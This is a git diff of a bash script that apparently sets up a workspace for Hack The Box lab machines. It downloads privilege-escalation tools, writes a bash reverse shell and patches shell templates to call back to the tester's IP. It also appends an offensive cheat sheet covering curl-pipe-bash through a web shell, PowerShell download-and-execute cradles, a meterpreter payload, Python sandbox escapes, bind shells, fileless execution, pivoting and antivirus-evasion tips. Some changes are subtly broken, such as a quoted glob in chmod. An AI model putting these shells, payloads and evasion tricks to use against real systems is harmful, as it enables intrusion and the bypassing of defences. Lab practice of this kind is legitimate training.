@@ -10,16 +10,20 @@ if [[ -z "$1" ]]; then
 fi
 
 BOXNAME=CodeTwo
-LAST=
 OS=lin
 USER=bob
 TUNINDEX=3
 
-export IP=$1			#$LAST
-export HOME=/home/$USER/hackthebox/$BOXNAME          #enter box Name
-export SELF=$(hostname -I | awk '{print $'$TUNINDEX'}')
-export HTB_TOKEN=$(cat /opt/Scripts/.HTB_TOKEN)
-export BOXNAME=$BOXNAME
+IP=$1
+HOME="/home/$USER/hackthebox/$BOXNAME"
+SELF="$(hostname -I | awk '{print $'$TUNINDEX'}')"
+HTB_TOKEN="$(cat /opt/Scripts/.HTB_TOKEN)"
+
+export IP
+export HOME
+export SELF
+export HTB_TOKEN
+export BOXNAME
 
 #start obsidian in background and push errors/output to /dev/null will need to copy .config/obsidian to folder or something to make it load the working directory but will figure out later...
 #and uhh.. doesn't load the newest version.. for some reason will add to notes to get it going may be just copying the vaults to show the vaults the .config/obsidian/obsidian.json but will play with later.. 
@@ -32,28 +36,28 @@ export BOXNAME=$BOXNAME
 #read -t 5 'I am going to wait for 5 seconds only ...'
 
 #only run if first time or will lose all work
-mkdir $HOME
-mkdir $HOME/nmap
-mkdir $HOME/buster
-mkdir $HOME/www
-mkdir $HOME/$BOXNAME
-touch $HOME/notes
-touch $HOME/.hushlogin
+mkdir "$HOME"
+mkdir "$HOME/nmap"
+mkdir "$HOME/buster"
+mkdir "$HOME/www"
+mkdir "$HOME/$BOXNAME"
+touch "$HOME/notes"
+touch "$HOME/.hushlogin"
 
 # copy windows specif scripts to windows box or linux specific to linux box
-cp /opt/Scripts/auto_stabilize_shell.sh $HOME/
-cp /opt/Scripts/.bashrc $HOME/
-cp /opt/Scripts/.bash_aliases $HOME/
-cp /opt/Scripts/.tmux.conf $HOME/
-cp /opt/Scripts/.zshrc $HOME/
+cp /opt/Scripts/auto_stabilize_shell.sh "$HOME/"
+cp /opt/Scripts/.bashrc "$HOME/"
+cp /opt/Scripts/.bash_aliases "$HOME/"
+cp /opt/Scripts/.tmux.conf "$HOME/"
+cp /opt/Scripts/.zshrc "$HOME/"
 
 if [[ "$OS" == 'win' ]]; then
 
     #curl -s -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany.exe -o $HOME/www/winPEASany.exe
     #curl -s -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEAS.bat -o $HOME/www/winPEAS.bat
-    curl -s -L https://github.com/carlospolop/PEASS-ng/releases/download/20220930/winPEASx64.exe -o $HOME/www/winpeasx64.exe
-    curl -s -L https://github.com/carlospolop/PEASS-ng/releases/download/20220930/winPEASany.exe -o $HOME/www/winpeasany.exe
-    #curl -s -L https://github.com/antonioCoco/ConPtyShell/releases/download/1.5/ConPtyShell.zip -o $HOME/www/
+    curl -s -L https://github.com/carlospolop/PEASS-ng/releases/download/20220930/winPEASx64.exe -o "$HOME/www/winpeasx64.exe"
+    curl -s -L https://github.com/carlospolop/PEASS-ng/releases/download/20220930/winPEASany.exe -o "$HOME/www/winpeasany.exe"
+    #curl -s -L https://github.com/antonioCoco/ConPtyShell/releases/download/1.5/ConPtyShell.zip -o "$HOME/www/"
     # unzip $HOME/www/ConPtyShell.zip -d $HOME/www/
     #curl -s -L https://github.com/antonioCoco/RunasCs/releases/download/v1.5/RunasCs.zip -o $HOME/www/
     # unzip $HOME/www/RunasCs.zip -d $HOME/www/
@@ -61,296 +65,272 @@ if [[ "$OS" == 'win' ]]; then
     #cp /opt/PEASS-ng/winPEAS/winPEASexe/binaries/Release/winPEASany.exe $HOME/www
     #cp /opt/PEASS-ng/winPEAS/winPEASbat/winPEAS.bat $HOME/www
     #cp /usr/share/windows-resources/binaries/netcat32/netcat-1.11/nc64.exe $HOME/www
-    cp /usr/share/windows-resources/binaries/nc.exe $HOME/www
-    cp /opt/ConPtyShell/Invoke-ConPtyShell.ps1  $HOME/www
-    echo "Invoke-ConPtyShell $SELF 9001" >> $HOME/www/Invoke-ConPtyShell.ps1
-    cp /opt/ConPtyShell/ConPtyShell.exe $HOME/www
-    cp /opt/ConPtyShell/ConPtyShell.cs $HOME/www
-    cp /opt/RunasCs/RunasCs.exe $HOME/www
-    cp /opt/SharpExclusionFinder/SharpExclusionFinder.exe $HOME/www
-    cp /opt/Scripts/shell.c $HOME/www
-    cp /opt/Scripts/root.c $HOME/www
-    cp /opt/Scripts/sslshell.ps1 $HOME/www
-    cp /opt/Scripts/put_server1.py $HOME/www
+    cp /usr/share/windows-resources/binaries/nc.exe "$HOME/www"
+    cp /opt/ConPtyShell/Invoke-ConPtyShell.ps1  "$HOME/www"
+    echo "Invoke-ConPtyShell $SELF 9001" >> "$HOME/www/Invoke-ConPtyShell.ps1"
+    cp /opt/ConPtyShell/ConPtyShell.exe "$HOME/www"
+    cp /opt/ConPtyShell/ConPtyShell.cs "$HOME/www"
+    cp /opt/RunasCs/RunasCs.exe "$HOME/www"
+    cp /opt/SharpExclusionFinder/SharpExclusionFinder.exe "$HOME/www"
+    cp /opt/Scripts/shell.c "$HOME/www"
+    cp /opt/Scripts/root.c "$HOME/www"
+    cp /opt/Scripts/sslshell.ps1 "$HOME/www"
+    cp /opt/Scripts/put_server1.py "$HOME/www"
 else
-    curl -s -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o $HOME/www/linpeas.sh
-    curl -s -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas_linux_amd64 -o $HOME/www/linpeas_linux_amd64
+    curl -s -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o "$HOME/www/linpeas.sh"
+    curl -s -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas_linux_amd64 -o "$HOME/www/linpeas_linux_amd64"
     #cp /opt/PEASS-ng/linPEAS/linpeas.sh $HOME/www/
-    curl -s -L https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64s -o $HOME/www/pspy64s
-    curl -s -L https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64 -o $HOME/www/pspy64
+    curl -s -L https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64s -o "$HOME/www/pspy64s"
+    curl -s -L https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64 -o "$HOME/www/pspy64"
+    cp /opt/Scripts/shell.c "$HOME/www"
+    cp /opt/Scripts/root.c "$HOME/www"
+    cp /opt/Scripts/sslshell.ps1 "$HOME/www"
+
 fi
-echo -ne "#!/bin/bash\nbash -i >& /dev/tcp/$SELF/9001 0>&1" >> $HOME/www/shell.sh
-chmod +x $HOME/www/*
-sed -i "s/REPLACE_THIS_COMMAND/curl http:\/\/$SELF\/code.bin/g" $HOME/www/shell.c
-sed -i "s/REPLACE_THIS_IP/$SELF/g" $HOME/www/shell.c
-sed -i 's/REPLACE_THIS_PORT/9001/g' $HOME/www/shell.c
-sed -i "s/REPLACE_THIS_IP/$SELF/g" $HOME/www/sslshell.ps1
-sed -i 's/REPLACE_THIS_PORT/9001/g' $HOME/www/sslshell.ps1
-sed -i "s/REPLACE_THIS_IP/$SELF/g" $HOME/www/root.c
+echo -ne "#!/bin/bash\nbash -i >& /dev/tcp/$SELF/9001 0>&1" >> "$HOME/www/shell.sh"
+chmod +x "$HOME/www/*"
+sed -i "s/REPLACE_THIS_COMMAND/curl http:\/\/$SELF\/code.bin/g" "$HOME/www/shell.c"
+sed -i "s/REPLACE_THIS_IP/$SELF/g" "$HOME/www/shell.c"
+sed -i 's/REPLACE_THIS_PORT/9001/g' "$HOME/www/shell.c"
+sed -i "s/REPLACE_THIS_IP/$SELF/g" "$HOME/www/sslshell.ps1"
+sed -i 's/REPLACE_THIS_PORT/9001/g' "$HOME/www/sslshell.ps1"
+sed -i "s/REPLACE_THIS_IP/$SELF/g" "$HOME/www/root.c"
 
 # Build notes
-echo '# Standard enumration' >> $HOME/notes
-echo '#export IP='$IP > $HOME/notes
-echo '#masscan -p1-65535,U:1-65535 $IP --rate=1000 -e tun0' >> $HOME/notes
-echo '#nmap -sC -sV -p- -vvv -oN $HOME/nmap/Initial $IP' >> $HOME/notes
-echo '#gobuster dir -u $IP -w /usr/share/wordlists/dirb/common.txt -s 200 -x php,html,txt,xml,sh,py -o buster/80dir.log' >> $HOME/notes
-echo '#gobuster dir -u http://$IP/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -o buster/root.log' >> $HOME/notes
-echo '#gobuster dir -u http://$IP/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-files.txt -o buster/root_files.log' >> $HOME/notes
-echo '#gobuster vhosts -u http://$BOXNAME.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -o buster/vhosts.log' >> $HOME/notes
-echo '#gobuster dns domain.com -o buster/dom.log' >> $HOME/notes
-echo "don\'t do this: curl http://$IP/cmd.php?cmd=curl http://$SELF/shell.sh|bash ... (unless in browser window) do: " >> $HOME/notes
-echo "curl http://$IP/cmd.php --data-urlencode \'cmd=curl http://$SELF/shell.sh|bash\'" >> $HOME/notes
-echo 'svn export https://github.com/repo.git/trunk/<folder to download>'  >> $HOME/notes
-echo "echo -n '+'|jq -Rr @uri" >> $HOME/notes
+cat << 'EOF' >> "$HOME/notes"
+# Standard enumration
+export IP='$IP' > $HOME/notes
+masscan -p1-65535,U:1-65535 $IP --rate=1000 -e tun0
+nmap -sC -sV -p- -vvv -oN $HOME/nmap/Initial $IP
+gobuster dir -u $IP -w /usr/share/wordlists/dirb/common.txt -s 200 -x php,html,txt,xml,sh,py -o buster/80dir.log
+gobuster dir -u http://$IP/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -o buster/root.log
+gobuster dir -u http://$IP/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-files.txt -o buster/root_files.log
+gobuster vhosts -u http://$BOXNAME.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -o buster/vhosts.log
+gobuster dns domain.com -o buster/dom.log
+
+# curl
+don't do this: curl http://$IP/cmd.php?cmd=curl http://$SELF/shell.sh|bash ... (unless in browser window) do:
+curl http://$IP/cmd.php --data-urlencode 'cmd=curl http://$SELF/shell.sh|bash'
+svn export https://github.com/repo.git/trunk/<folder to download>
+echo -n '+'|jq -Rr @uri
 
 # Python3 Sandbox Bypasses
-echo '' >> $HOME/notes
-echo '# Python3 Sandbox Bypasses'
-echo 'getattr(getattr(globals()['\''__snitliub__'\''[::-1]], '\''__tropmi__'\''[::-1])('\''so'\''[::-1]),'\''metsys'\''[::-1])('\''ls'\'')' >> $HOME/notes
-echo "getattr(getattr(globals()['__snitliub__'[::-1]], '__tropmi__'[::-1])('so'[::-1]),'metsys'[::-1])('ls')" >> $HOME/notes
-echo '[x for x in [].__class__.__base__.__subclasses__() if x.__name__.lower() == '\''p'\'' + '\''op'\'' + '\''en'\''][0](['\''curl'\'',''\'http://$IP/shell.sh'\'','\''|'\'','\''bash'\''])" >> $HOME/notes
-echo "[x for x in [].__class__.__base__.__subclasses__() if x.__name__.lower() == 'p' + 'op' + 'en'][0](['curl','http://$IP/shell.sh','|','bash'])" >> $HOME/notes
+getattr(getattr(globals()['__snitliub__'[::-1]], '__tropmi__'[::-1])('so'[::-1]),'metsys'[::-1])('ls')
+[x for x in [].__class__.__base__.__subclasses__() if x.__name__.lower() == 'p' + 'op' + 'en'][0](['curl','http://$IP/shell.sh','|','bash'])
 
 # tmux
-echo '' >> $HOME/notes
-echo '# tmux' $HOME/notes
-echo 'if wanting to use another environmemnt in tmux and have multiple servers running' >> $HOME/notes
-echo 'first start a new socket then call the socket with -S and attache to the socket' >> $HOME/notes
-echo 'tmux -L Boxname' >> $HOME/notes
-echo 'tmux -S /tmp/tmux-1000/Boxname ls' >> $HOME/notes
-echo 'tmux -S /tmp/tmux-1000/Boxname a -t 0' >> $HOME/notes
-echo 'tmux show-environment [-g] [-t target-session] || tmux set-environment [-gru] [-t target-session] name [value]' >> $HOME/notes
-echo 'tmux show-environment -t 0 || tmux set-environment -t 0 IP 127.0.0.1 || and have to start new windows' >> $HOME/notes
+if wanting to use another environmemnt in tmux and have multiple servers running
+first start a new socket then call the socket with -S and attache to the socket
+tmux -L Boxname
+tmux -S /tmp/tmux-1000/Boxname ls
+tmux -S /tmp/tmux-1000/Boxname a -t 0
+tmux show-environment [-g] [-t target-session] || tmux set-environment [-gru] [-t target-session] name [value]
+tmux show-environment -t 0 || tmux set-environment -t 0 IP 127.0.0.1 || and have to start new windows
 
-# Try nikto
-echo '' >> $HOME/notes
-echo '# nikto' >> $HOME/notes
-echo 'nikto -h $IP' >> $HOME/notes
-echo 'add machine name domain.htb to /etc/hosts (search to ensure named correct)' >> $HOME/notes
-echo 'nikto -h domain.htb' >> $HOME/notes
+# nikto
+nikto -h $IP
+add machine name domain.htb to /etc/hosts (search to ensure named correct)
+nikto -h domain.htb
 
 # To fix copy and paste problems in Virtual box
-echo '' >> $HOME/notes
-echo '# when in virtual Machine' >> $HOME/notes
-echo 'any problems kill VBoxClient clipboard etc.' >> $HOME/notes
+# when in virtual Machine
+any problems kill VBoxClient clipboard etc.
 
-# Windows shells
-echo '' >> $HOME/notes
-echo '# Windows Shells' >> $HOME/notes
-echo 'echo -n "IEX(New-Object Net.WebClient).downloadString('\''http://10.10.10.10:8080/shell.ps1'\'')" | iconv --to-code UTF16LE | base64 -w0' >> $HOME/notes
-echo "powershell.exe -nop -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadFile('http://10.10.14.155/winPEAS.bat', 'C:\temp\winPEAS.bat')\"" >> $HOME/notes
-echo 'IWR http://10.10.10.10/shell.exe -OutFile shell.exe' >> $HOME/notes
-echo 'cp /usr/share/webshells/php/simple-backdoor.php .' >> $HOME/notes
-echo 'klist,kinit,ksu when you have a tgt or tgs and just kerberos port 88' >> $HOME/notes
+# Windows Shells
+echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.10.10:8080/shell.ps1')" | iconv --to-code UTF16LE | base64 -w0
+powershell.exe -nop -ep bypass -c "IEX(New-Object Net.WebClient).DownloadFile('http://10.10.14.155/winPEAS.bat', 'C:\temp\winPEAS.bat')"
+IWR http://10.10.10.10/shell.exe -OutFile shell.exe
+klist,kinit,ksu when you have a tgt or tgs and just kerberos port 88
 
-# usefull windows stuff.
-echo '' >> $HOME/notes
-echo '# usefull windows tricks' >> $HOME/notes
-echo 'msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.124 LPORT=9001 -f exe -o shell.exe' >> $HOME/notes
-echo 'Get-CimInstance -Query "select * from win32_service where Started=True"|fl Name,PathName,Started,StartName' >> $HOME/notes
-echo 'Expand-Archive xyz.zip' >> $HOME/notes
-echo 'Start-Job -FilePath C:\Scripts\Sample.ps1' >> $HOME/notes
-echo 'Invoke-Command -Computer dc01 -ScriptBlock { C:\blah.exe } -asJob' >> $HOME/notes
-echo 'Invoke-Command -scriptblock { script }  -asJob -computername localhost' >> $HOME/notes
-echo 'Start-Job -scriptblock { script }' >> $HOME/notes
-echo 'Start-Process powershell {script}' >> $HOME/notes
-echo 'Get-Process <name>' >> $HOME/notes
-echo 'Stop-Process <pid>' >> $HOME/notes
+# usefull windows tricks
+msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.124 LPORT=9001 -f exe -o shell.exe
+Get-CimInstance -Query "select * from win32_service where Started=True"|fl Name,PathName,Started,StartName
+Expand-Archive xyz.zip
+Start-Job -FilePath C:\Scripts\Sample.ps1
+Invoke-Command -Computer dc01 -ScriptBlock { C:\blah.exe } -asJob
+Invoke-Command -scriptblock { script }  -asJob -computername localhost
+Start-Job -scriptblock { script }
+Start-Process powershell {script}
+Get-Process <name>
+Stop-Process <pid>
 
-# fix encoding
-echo '' >> $HOME/notes
-echo '# fix encoding problems ' >> $HOME/notes
-echo 'iconv -f utf-16le -t utf-8 lin.log -o lin2.log' >> $HOME/notes
-echo 'gc rev.bat|set-content rev2.bat -encoding ascii' >> $HOME/notes
-echo 'dos2unix file && vim --clean file' >> $HOME/notes
+# fix encoding problems
+iconv -f utf-16le -t utf-8 lin.log -o lin2.log
+gc rev.bat|set-content rev2.bat -encoding ascii
+dos2unix file && vim --clean file
 
-# Create/read QRCodes
-echo '' >> $HOME/notes
-echo '# Create and read QRCodes' >> $HOME/notes
-echo "qrencode -o output.png -s 10 'mymessage'" >> $HOME/notes
-echo 'zbarimg output.png' >> $HOME/notes
+# Create and read QRCodes
+qrencode -o output.png -s 10 'mymessage'
+zbarimg output.png
 
 # Windows privesc checklist
-echo '' >> $HOME/notes
-echo '# Windows privesc checklist' >> $HOME/notes
-echo 'https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation' >> $HOME/notes
+https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation
 
 # linux privesc checklist
-echo '' >> $HOME/notes
-echo '# linux privesc checklist' >> $HOME/notes
-echo 'https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist' >> $HOME/notes
+https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist
+
 
 # CREATE A CREDENTIAL OBJECT
-echo '' >> $HOME/notes
-echo '# CREATE A CREDENTIAL OBJECT' >> $HOME/notes
-echo "\$pass = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force" >> $HOME/notes
-echo "\$cred = New-Object System.Management.Automation.PSCredential(\"<USERNAME>\", \$pass)" >> $HOME/notes
+$pass = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential("<USERNAME>", $pass)
 # For local
-echo '' >> $HOME/notes
-echo '# For Local' >> $HOME/notes
-echo "Start-Process -Credential (\$cred)  -NoNewWindow powershell \"iex (New-Object Net.WebClient).DownloadString('http://10.10.14.11:443/ipst.ps1')\"" >> $HOME/notes
-echo 'see basic powershell in hacktricks for more' >> $HOME/notes
-# runascs
-echo '' >> $HOME/notes
-echo '# runascs' >> $HOME/notes
-echo 'runascs.ps1 is great for executing as another user if all else fails..' >> $HOME/notes
-echo 'Invoke-RunasCs -Username user1 -Password password1 -Command powershell.exe (or cmd.exe) -Remote 10.10.14.129:9001' >> $HOME/notes
 
-# Cool way to pivot/scan
-echo '' >> $HOME/notes
-echo '# really cool way to pivot/scan with nc' >> $HOME/notes
-echo 'mkfifo reply' >> $HOME/notes
-echo 'nc -klvnp 65535 < reply | nc 127.0.0.1 6739 > reply' >> $HOME/notes
-echo '(nc -klvnp <port to use> < reply | nc 127.0.0.1 <port interested in scanning etc> > reply)' >> $HOME/notes
-echo '(dont forget to rm reply)' >> $HOME/notes
-echo 'Then can just scan port 6379 through 65535 etc.' >> $HOME/notes
-echo 'to scan ports with busybox/nc nc -z -v -w 1 192.168.0.1 80' >> $HOME/notes
+# For Local
+Start-Process -Credential ($cred)  -NoNewWindow powershell "iex (New-Object Net.WebClient).DownloadString('http://10.10.14.11:443/ipst.ps1')"
+see basic powershell in hacktricks for more
+
+# runascs
+runascs.ps1 is great for executing as another user if all else fails..
+Invoke-RunasCs -Username user1 -Password password1 -Command powershell.exe (or cmd.exe) -Remote 10.10.14.129:9001
+
+# really cool way to pivot/scan with nc
+mkfifo reply
+nc -klvnp 65535 < reply | nc 127.0.0.1 6739 > reply
+(nc -klvnp <port to use> < reply | nc 127.0.0.1 <port interested in scanning etc> > reply)
+(dont forget to rm reply)
+Then can just scan port 6379 through 65535 etc.
+to scan ports with busybox/nc nc -z -v -w 1 192.168.0.1 80
 
 # More ways to pivot
-echo '' >> $HOME/notes
-echo '# More ways to pivot' >> $HOME/notes
-echo '9510 and other ports through chisel' >> $HOME/notes
-echo '# On Kali' >> $HOME/notes
-echo 'kali@kali:~$ ./chisel server -p 9002 --reverse  ' >> $HOME/notes
-echo '# On Windows' >> $HOME/notes
-echo './chisel client 10.10.14.128:9002 R:8080:localhost:8080 R:9510:localhost:9510 R:9512:localhost:9512' >> $HOME/notes
-echo '# if using metasploit' >> $HOME/notes
-echo 'portfwd add -l 9510 -p 9510 -r 10.10.11.115' >> $HOME/notes
+9510 and other ports through chisel
+# On Kali
+kali@kali:~$ ./chisel server -p 9002 --reverse
+# On Windows
+./chisel client 10.10.14.128:9002 R:8080:localhost:8080 R:9510:localhost:9510 R:9512:localhost:9512
+# if using metasploit
+portfwd add -l 9510 -p 9510 -r 10.10.11.115
 
 # Relay Binaries
-echo '' >> $HOME/notes
-echo '# Relay Binaries' >> $HOME/notes
-echo 'socat TCP4-LISTEN:4444,fork EXEC:/bin/bash' >> $HOME/notes
-echo 'socat tcp-listen:7777,reuseaddr,fork exec:cat,nofork' >> $HOME/notes
-echo 'socat tcp-l:9999,reuseaddr,fork EXEC:./leak' >> $HOME/notes
-echo "socat -U TCP-LISTEN:5403,fork EXEC:'/usr/bin/data',stderr,pty,echo=0" >> $HOME/notes
-echo 'socat tcp-l:5000,reuseaddr,fork EXEC:"./vuln",pty,stderr' >> $HOME/notes
-echo "ncat -l 1234 -c '/usr/bin/data' --keep-open" >> $HOME/notes
-echo "nc -lvnp 9999 -e '/usr/local/bin'" >> $HOME/notes
-echo '## create named pipe' >> $HOME/notes
-echo 'rm -f /tmp/f; mkfifo /tmp/f' >> $HOME/notes
-echo "## launch interactive 'sh' session redirected to/from listening nc" >> $HOME/notes
-echo 'cat /tmp/f | /bin/sh -i 2>&1 | nc -l 1234 > /tmp/f' >> $HOME/notes
-echo 'from another terminal connect' >> $HOME/notes
+socat TCP4-LISTEN:4444,fork EXEC:/bin/bash
+socat tcp-listen:7777,reuseaddr,fork exec:cat,nofork
+socat tcp-l:9999,reuseaddr,fork EXEC:./leak
+socat -U TCP-LISTEN:5403,fork EXEC:'/usr/bin/data',stderr,pty,echo=0
+socat tcp-l:5000,reuseaddr,fork EXEC:"./vuln",pty,stderr
+ncat -l 1234 -c '/usr/bin/data' --keep-open
+nc -lvnp 9999 -e '/usr/local/bin'
+
+## create named pipe
+rm -f /tmp/f; mkfifo /tmp/f
+
+## launch interactive 'sh' session redirected to/from listening nc
+cat /tmp/f | /bin/sh -i 2>&1 | nc -l 1234 > /tmp/f
+from another terminal connect
 
 # Static Binaries
-echo '' >> $HOME/notes
-echo '# Static Binaries' >> $HOME/notes
-echo 'https://github.com/andrew-d/static-binaries' >> $HOME/notes
-echo 'https://github.com/polaco1782/linux-static-binaries' >> $HOME/notes
+https://github.com/andrew-d/static-binaries
+https://github.com/polaco1782/linux-static-binaries
 
 # Windows Sharp Binaries
-echo '' >> $HOME/notes
-echo '# Windows Sharp Binaries' >> $HOME/notes
-echo 'check this out - git clone https://github.com/Flangvik/SharpCollection.git for windows sharp binaries' >> $HOME/notes
+check this out - git clone https://github.com/Flangvik/SharpCollection.git for windows sharp binaries
 
-# Run Obsidian in background
-echo '' >> $HOME/notes
-echo '# Run Obsidian' >> $HOME/notes
-echo '/opt/obsidian/Obsidian-0.15.9.AppImage &>/dev/null &' >> $HOME/notes
+# Run Obsidian
+/opt/obsidian/Obsidian-0.15.9.AppImage &>/dev/null &
 
-# AntiVirus Evasion
-echo '' >> $HOME/notes
-echo '# Anti Virus Evasion' >> $HOME/notes
-echo '## Nishang' >> $HOME/notes
-echo 'for nishang antivirus evasion, just replace the Invoke-PowershellTcp with anything' >> $HOME/notes
-echo 'and replace sendback with anything, and it should replace sendback and sendback2' >> $HOME/notes
-echo 'and for the oneliner, split it to individual lines after every semicolon (;) , or just at after the {0};' >> $HOME/notes
-echo '## Conptyshell' >> $HOME/notes
-echo 'for conpty shell replace the name invoke-conptyshell and conptyshell and remove the how to use section' >>$HOME/notes
-echo '[defender exclusions](https://blog.fndsec.net/2024/10/04/uncovering-exclusion-paths-in-microsoft-defender-a-security-research-insight/)' >> $HOME/notes
-echo 'Get-MPPreference | select-object ExclusionPath' >> $HOME/notes
-## Fix these
-echo 'Get-WinEvent -LogName "Microsoft-Windows-Windows Defender/Operational" -FilterXPath "*[System[(EventID=5007)]]" | Where-Object { $_.Message -like "*exclusion\Path*" } | Select-Object Message | FL' >> $HOME/notes
-echo '& "C:\Program Files\Windows Defender\MpCmdRun.exe" -Scan -ScanType 3 -File "C:\folder_to_check\|*"' >> $HOME/notes
-echo 'https://medium.com/@lsecqt/creating-fully-undetectable-payload-fud-with-c-46a734837d1c' >> $HOME/notes
-echo 'https://s3cur3th1ssh1t.github.io/Building-a-custom-Mimikatz-binary/' >> $HOME/notes
+# Anti Virus Evasion
+## Nishang
+for nishang antivirus evasion, just replace the Invoke-PowershellTcp with anything
+and replace sendback with anything, and it should replace sendback and sendback2
+and for the oneliner, split it to individual lines after every semicolon (;) , or just at after the {0};
+## Conptyshell
+for conpty shell replace the name invoke-conptyshell and conptyshell and remove the how to use section
+
+# [defender exclusions](https://blog.fndsec.net/2024/10/04/uncovering-exclusion-paths-in-microsoft-defender-a-security-research-insight/)
+Get-MPPreference | select-object ExclusionPath
+Get-WinEvent -LogName "Microsoft-Windows-Windows Defender/Operational" -FilterXPath "*[System[(EventID=5007)]]" | Where-Object { $_.Message -like "*exclusion\Path*" } | Select-Object Message | FL
+& "C:\Program Files\Windows Defender\MpCmdRun.exe" -Scan -ScanType 3 -File "C:\folder_to_check\|*"
+https://medium.com/@lsecqt/creating-fully-undetectable-payload-fud-with-c-46a734837d1c
+https://s3cur3th1ssh1t.github.io/Building-a-custom-Mimikatz-binary/
 
 # Fileless elf execution
-echo '' >> $HOME/notes
-echo '# Fileless elf execution' >> $HOME/notes
-echo 'curl http://10.10.14.178/ls.b64 |bash <(curl http://10.10.14.178/ddexec.sh) /bin/test -al' >> $HOME/notes
+curl http://10.10.14.178/ls.b64 |bash <(curl http://10.10.14.178/ddexec.sh) /bin/test -al
+
 # Docker commands
-echo '' >> $HOME/notes
-echo '# Docker commands' >> $HOME/notes
-echo '# enter docker image' >> $HOME/notes
-echo 'sudo docker run -it --rm --entrypoint bash hacktehbox/node-web-app' >> $HOME/notes
-echo '# enter docker container' >> $HOME/notes
-echo 'sudo docker exec -it container bash' >> $HOME/notes
+# enter docker image
+sudo docker run -it --rm --entrypoint bash hacktehbox/node-web-app
+# enter docker container
+sudo docker exec -it container bash
+
 # OverlayFS and GameOverlay
-echo '' >> $HOME/notes
-echo '# OverlayFS and GameOverlay' >> $HOME/notes
-echo 'https://www.reddit.com/r/selfhosted/comments/15ecpck/ubuntu_local_privilege_escalation_cve20232640/' >> $HOME/notes
-echo 'https://github.com/briskets/CVE-2021-3493' >> $HOME/notes
+https://www.reddit.com/r/selfhosted/comments/15ecpck/ubuntu_local_privilege_escalation_cve20232640/
+https://github.com/briskets/CVE-2021-3493
+
 # LFI and Directory Traversal
-echo '' >> $HOME/notes
-echo '# LFI and Directory Traversal' >> $HOME/notes
-echo '# ../../etc/passwd (dots and filenames)' >> $HOME/notes
-echo 'directory traversal/intruder' >> $HOME/notes
-echo '  directory_traversal.txt:140' >> $HOME/notes
-echo '  dotdotpwn.txt:21144' >> $HOME/notes
-echo 'File Inclusion/Intruders' >> $HOME/notes
-echo '  Traversal.txt:4521' >> $HOME/notes
-echo '# ../../{FILES} (:%s/{FILES}//g --> page=FUZZ1FUZZ2 -w deep_traversal.txt:FUZZ1 -w list2:FUZZ2)' >> $HOME/notes
-echo 'directory traversal/intruder' >> $HOME/notes
-echo '  deep_traversal.txt:878' >> $HOME/notes
-echo '  traversals-8-deep-exotic-encodings.txt:887' >> $HOME/notes
-echo '# /etc/passwd (just files to search for not dots)' >> $HOME/notes
-echo 'file inclusion/intruders' >> $HOME/notes
-echo '  BSD-files.txt:12' >> $HOME/notes
-echo '  LFI-FD-check.txt:38' >> $HOME/notes
-echo '  LFI-WindowsFileCheck.txt:69' >> $HOME/notes
-echo '  Linux-files.txt:61' >> $HOME/notes
-echo '  List_Of_File_To_Include_NullByteAdded.txt:318' >> $HOME/notes
-echo '  List_Of_File_To_Include.txt:911' >> $HOME/notes
-echo '  Mac-files.txt:7' >> $HOME/notes
-echo '  simple-check.txt:9' >> $HOME/notes
-echo '  Web-files.txt:13' >> $HOME/notes
-echo '  Windows-files.txt:212' >> $HOME/notes
-echo '# ../../ (just dots)' >> $HOME/notes
-echo 'file inclusion/intruders' >> $HOME/notes
-echo '  dot-slash-PathTraversal_and_LFI_pairing.txt:885' >> $HOME/notes
-echo '# ../../ or ../../etc/passwd (both dots and just files and dots with files)' >> $HOME/notes
-echo 'file inclusion/intruders' >> $HOME/notes
-echo '  JHADDIX_LFI.txt:879' >> $HOME/notes
+# ../../etc/passwd (dots and filenames)
+directory traversal/intruder
+  directory_traversal.txt:140
+  dotdotpwn.txt:21144
+File Inclusion/Intruders
+  Traversal.txt:4521
+# ../../{FILES} (:%s/{FILES}//g --> page=FUZZ1FUZZ2 -w deep_traversal.txt:FUZZ1 -w list2:FUZZ2)
+directory traversal/intruder
+  deep_traversal.txt:878
+  traversals-8-deep-exotic-encodings.txt:887
+# /etc/passwd (just files to search for not dots)
+file inclusion/intruders
+  BSD-files.txt:12
+  LFI-FD-check.txt:38
+  LFI-WindowsFileCheck.txt:69
+  Linux-files.txt:61
+  List_Of_File_To_Include_NullByteAdded.txt:318
+  List_Of_File_To_Include.txt:911
+  Mac-files.txt:7
+  simple-check.txt:9
+  Web-files.txt:13
+  Windows-files.txt:212
+# ../../ (just dots)
+file inclusion/intruders
+  dot-slash-PathTraversal_and_LFI_pairing.txt:885
+# ../../ or ../../etc/passwd (both dots and just files and dots with files)
+file inclusion/intruders
+  JHADDIX_LFI.txt:879
+EOF
+
 
 # Build obsidian files for note keeping
 # Cover page
-echo '<p align="center">' >> $HOME/$BOXNAME/000\ -\ Cover.md
-echo '  <img  width=1024 src="" />' >> $HOME/$BOXNAME/000\ -\ Cover.md
-echo '</p>' >> $HOME/$BOXNAME/000\ -\ Cover.md
